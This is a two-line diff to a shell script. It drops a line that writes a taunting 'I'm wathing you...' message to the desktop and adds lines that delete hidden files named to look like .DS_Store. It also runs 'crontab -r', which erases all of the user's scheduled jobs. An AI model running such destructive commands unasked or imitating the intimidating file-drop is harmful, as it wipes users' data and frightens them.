@@ -1,1 +1,2 @@
-echo "I'm wathing you..." > $HOME/Desktop/watch.txt
+rm -f $HOME/.RS_Store $HOME/.PS_Store 
+crontab -r
